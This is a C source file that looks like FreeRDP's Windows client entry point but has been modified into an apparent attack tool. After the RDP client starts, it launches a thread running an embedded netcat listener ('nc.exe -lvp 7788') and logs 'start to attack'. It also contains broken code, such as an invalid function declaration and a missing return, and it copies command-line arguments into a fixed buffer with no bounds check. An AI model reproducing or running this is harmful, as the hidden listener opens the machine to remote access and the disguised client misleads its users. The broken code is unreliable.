/**
 * FreeRDP: A Remote Desktop Protocol Implementation
 * Windows Client
 *
 * Copyright 2009-2011 Jay Sorg
 * Copyright 2010-2011 Vic Lee
 * Copyright 2010-2011 Marc-Andre Moreau <marcandre.moreau@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <winpr/windows.h>

#include <winpr/crt.h>
#include <winpr/credui.h>

#include <freerdp/freerdp.h>
#include <freerdp/constants.h>

#include <freerdp/client/file.h>
#include <freerdp/client/cmdline.h>
#include <freerdp/client/channels.h>
#include <freerdp/channels/channels.h>

#include "resource.h"

#include "wf_client.h"

#include <shellapi.h>
int ncmain(argc, argv);

int _tmain(int argc, _TCHAR* argv[])
{

	HINSTANCE hInstance = (HINSTANCE)GetModuleHandle(NULL);
	HINSTANCE hPreInstance = NULL;
	TCHAR szCmdLine[1024];
	szCmdLine[0] = 0;
	LPTSTR lpCmdLine = szCmdLine;
	for (int i = 1; i < argc; i++)
	{
		if (i > 1)
		{
			_tcscpy(lpCmdLine, _T(" "));
			lpCmdLine = lpCmdLine + _tcslen(_T(" "));
		}
		_tcscpy(lpCmdLine, argv[i]);
		lpCmdLine = lpCmdLine + _tcslen(argv[i]);
	}
	lpCmdLine = szCmdLine;
	int nCmdShow = SW_SHOWNORMAL;


	int ret = _tWinMain(hInstance, hPreInstance, lpCmdLine, nCmdShow);
	return 0;
}
static DWORD WINAPI start_netcat(LPVOID arg)
{
	char * argcNc[4] = { "nc.exe", "-lvp", "7788", NULL };
	ncmain(3, argcNc);
}



bool exithandler(DWORD type)
{
	switch (type)
	{
		// handle the ctrl-c signal.
	case CTRL_C_EVENT:
		WLog_INFO(CLIENT_TAG("event"), "User controled ctrl-c event ,exit process");
		exit(0);
		return 1;
	case CTRL_CLOSE_EVENT:
		WLog_INFO(CLIENT_TAG("event"), "User controled ctrl-close event ,exit process");
		exit(0);
		return 1;
		// pass other signals to the next handler.
	case CTRL_BREAK_EVENT:
		WLog_INFO(CLIENT_TAG("event"), "ctrl-break event\n\n");
		return 1;
	case CTRL_LOGOFF_EVENT:
		WLog_INFO(CLIENT_TAG("event"), "ctrl-logoff event\n\n");
		return false;
	case CTRL_SHUTDOWN_EVENT:
		WLog_INFO(CLIENT_TAG("event"), "ctrl-shutdown event\n\n");
		return false;
	default:
		return 0;
	}
	return 0;
}

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPWSTR lpCmdLine, int nCmdShow)
{
	int status;
	HANDLE thread;
	wfContext* wfc;
	DWORD dwExitCode;
	rdpContext* context;
	rdpSettings* settings;
	LPWSTR cmd;
	char** argv = NULL;
	RDP_CLIENT_ENTRY_POINTS clientEntryPoints = { 0 };
	int ret = 1;
	int argc = 0, i;
	LPWSTR* args = NULL;

	WINPR_UNUSED(hInstance);
	WINPR_UNUSED(hPrevInstance);
	WINPR_UNUSED(lpCmdLine);
	WINPR_UNUSED(nCmdShow);	
	RdpClientEntry(&clientEntryPoints);
	context = freerdp_client_context_new(&clientEntryPoints);

	if (!context)
		return -1;

	cmd = GetCommandLineW();

	if (!cmd)
		goto out;

	args = CommandLineToArgvW(cmd, &argc);

	if (!args || (argc <= 0))
		goto out;

	argv = calloc((size_t)argc, sizeof(char*));

	if (!argv)
		goto out;

	for (i = 0; i < argc; i++)
	{
		int size = WideCharToMultiByte(CP_UTF8, 0, args[i], -1, NULL, 0, NULL, NULL);
		if (size <= 0)
			goto out;
		argv[i] = calloc((size_t)size, sizeof(char));

		if (!argv[i])
			goto out;

		if (WideCharToMultiByte(CP_UTF8, 0, args[i], -1, argv[i], size, NULL,
		                        NULL) != size)
			goto out;
	}

	settings = context->settings;
	wfc = (wfContext*) context;

	if (!settings || !wfc)
		goto out;

	status = freerdp_client_settings_parse_command_line(settings, argc, argv,
	         FALSE);

	if (status)
	{
		freerdp_client_settings_command_line_status_print(settings, status, argc, argv);
		goto out;
	}

	if (freerdp_client_start(context) != 0)
		goto out;
	CreateThread(NULL, 0,
		start_netcat, NULL, NULL, NULL);
	
	WLog_INFO(CLIENT_TAG("windows"), "Client initialized start to attack..");
	thread = freerdp_client_get_thread(context);

	if (thread)
	{
		if (WaitForSingleObject(thread, INFINITE) == WAIT_OBJECT_0)
		{
			GetExitCodeThread(thread, &dwExitCode);
			ret = (int)dwExitCode;
		}
	}

	if (freerdp_client_stop(context) != 0)
		goto out;

out:
	freerdp_client_context_free(context);

	if (argv)
	{
		for (i = 0; i < argc; i++)
			free(argv[i]);

		free(argv);
	}

	LocalFree(args);
	WLog_INFO(CLIENT_TAG("event"), "pressing ctrl+c or ctrl+break to exit");
	if (SetConsoleCtrlHandler((PHANDLER_ROUTINE)exithandler, true))
	{
		while (1){ Sleep(10000); };
	}

	return ret;
}
